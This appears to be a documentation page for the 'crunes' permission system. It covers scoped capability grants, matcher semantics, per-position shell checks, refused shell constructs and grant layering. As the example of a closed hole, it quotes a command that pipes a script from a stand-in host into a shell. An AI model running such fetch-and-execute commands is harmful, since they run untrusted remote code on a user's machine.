---
type: concept
title: Permission
description: A capability a rune may exercise, written as a token and a pattern, granted per lifecycle in configuration and checked at every call rather than assumed.
tags: [concept, permission, security]
---

# Permission

A permission is a string: a capability token, then a scope the token applies to.

```
fs.read:./src/**
shell.run:git *
http.fetch:GET::**/q/health
cache.write:@local-cache::qdev-server
```

Grants live in configuration — a project's `.crunes/config.json`, or a plugin's manifest — never in the rune. A rune cannot grant itself anything, and reading the rune tells you what it *attempts*, not what it *may*.

## Granted per lifecycle, never flat

Grants nest under the lifecycle they apply to:

```json
{ "permissions": { "run": { "allow": ["fs.read:./src/**"] } } }
```

A flat `{ "allow": [...] }` is rejected at config load rather than ignored, because a grant with no lifecycle has no meaning and silently dropping it would leave a rune mysteriously unable to read anything. `run` and `repl` are separate blocks and neither inherits from the other.

## The matcher depends on what is being matched

Two matchers exist, and which one applies is a property of the capability rather than of the pattern.

**Path-shaped values use glob semantics**, where `*` stops at a `/`. This covers `fs.*`, `http.*` and `ws.*`, because a path or URL segment boundary is a real security boundary: `fs.read:./src/*` should not reach `./src/secrets/key.pem`.

**Flat values use wildcard semantics**, where `*` matches anything including slashes, spaces and commas. This covers shell commands, rune keys, env var names and store names, because those have no segment structure — `shell.run:bash *` has to match `bash ./run.sh --profile=dev,staging`, and a path-aware matcher would silently refuse it.

## Shell grants are checked per command position

A shell grant authorises **one command in one position**, not a command line. `git log | head -20` needs both `shell.run:git *` and `shell.run:head *`, because each command in a pipeline, sequence, subshell or substitution is checked independently.

This closed a real hole: `shell.run:git *` matched against the whole line once authorised `git log && curl evil.sh | sh`. Redirect targets are checked too, as filesystem grants rather than shell ones — `> out.txt` needs `fs.write:out.txt`.

Commands that cannot be decomposed into positions are refused outright, and no grant overrides that: `eval`, `sh -c`, `xargs`, `find -exec`, a variable in command position, heredocs, process substitution and shell control structures. A construct that cannot be classified cannot be checked, and permitting it would make every other grant on the line advisory.

`crunes shell explain '<cmd>'` prints the positions, grants and redirect targets a command resolves to, which is the intended first move on a denial.

## Layering

Grants come from several places and combine by a fixed rule:

* **A plugin declares** what its runes need, and the user consents at install.
* **A project may replace** that list entirely for any rune it names. Replacement rather than addition is what lets a project *restrict* a plugin, which an additive model structurally cannot express.
* **Deny always unions.** A deny from any layer survives every layer above it, preserving a most-restrictive invariant.
* **Some grants are automatic.** A plugin rune always gets read access to its own installation directory, and never gets project access without asking.

The consequence worth knowing: declaring `allow` for a plugin rune drops the plugin's own grants, so the working set has to be restated. Omitting them does not add to the plugin's list, it replaces it with a shorter one, and the commands that worked yesterday stop.
